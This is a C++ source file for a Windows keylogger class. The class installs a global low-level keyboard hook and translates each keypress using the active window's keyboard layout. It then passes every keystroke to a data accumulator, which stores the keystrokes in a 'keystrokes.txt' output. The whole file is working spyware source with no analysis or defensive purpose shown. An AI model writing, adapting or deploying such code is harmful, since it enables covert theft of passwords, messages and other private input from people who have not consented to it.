#pragma once
#include "KeyLogger.h"
#include <stdio.h>
#include <Windows.h>

#define BUF_SIZE 100

KeyLogger* KeyLogger::instance;

KeyLogger::KeyLogger()
{
	mHookReleased = true;
}

KeyLogger::~KeyLogger()
{
	if (!mHookReleased)
	{
		Finalize();
	}
}

void KeyLogger::Init()
{
	instance = this;
	InstallHook();
	mHookReleased = false;
}

void KeyLogger::Finalize()
{
	UnhookWindowsHookEx(mHook);
	mHookReleased = true;
}

PSTR KeyLogger::GetName()
{
	return "keystrokes";
};

PSTR KeyLogger::GetExtension()
{
	return "txt";
};

void KeyLogger::InstallHook(void)
{
     // Retrieve the applications instance
    HINSTANCE appInstance = GetModuleHandle(NULL);

    // Set a global Windows Hook to capture keystrokes. Callback to static wrapper for non-static function
    mHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyLogger::LowLevelKeyboardProc, appInstance, 0 );

	// This will 'hang' the thread running (and listening for keystrokes)
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) > 0)
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
}

LRESULT CALLBACK KeyLogger::LowLevelKeyboardProc( int nCode, WPARAM wParam, LPARAM lParam )
{
	const int KEYNAME_LENGTH = 20;

	// This is needed according to MSDN
	if (nCode >= 0)
	{	
		KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT *)lParam;

		if (wParam == WM_KEYDOWN)
		{
			wchar_t key[KEYNAME_LENGTH] = {0}; // unicode!

			DWORD dwMsg = pKeyBoard->scanCode << 16;//0;

			// This block place key name into key wide string in a braces: [shift]
			key[0] = L'[';
			int act_length = GetKeyNameTextW(dwMsg, key+1, KEYNAME_LENGTH-1);
			WORD error = GetLastError();
			key[act_length + 1] = L']';

			if (act_length == 1) // i.e. letter/digit or signs: !@#$%^&*()_+-=
			{
				// This block retrieves keyboard layout of active window 
				GUITHREADINFO guiThreadInfo;
				guiThreadInfo.cbSize = sizeof(GUITHREADINFO);
				GetGUIThreadInfo(0, &guiThreadInfo);
				DWORD dwThreadID = GetWindowThreadProcessId(guiThreadInfo.hwndActive, NULL);
				HKL layout = GetKeyboardLayout(dwThreadID);

				// Translate to actual character depending on keyboard state and layout
				BYTE keyState[256];
				GetKeyboardState(keyState);
				key[0]=key[1]=key[2]=0; // reset key. Note that act_length=1 "[A]"
				ToUnicodeEx(pKeyBoard->vkCode, pKeyBoard->scanCode, keyState, key, 1, pKeyBoard->flags, layout);
			}

			// Log da key:
			instance->GetDataAccumulator()->LogKey(key);
			
			return HC_ACTION;
		}
	}

	HHOOK hhook = NULL;
	LRESULT result = CallNextHookEx(hhook, nCode, wParam, lParam);
	WORD error = GetLastError();
	if (error != ERROR_SUCCESS) return HC_ACTION;
	return result;
}
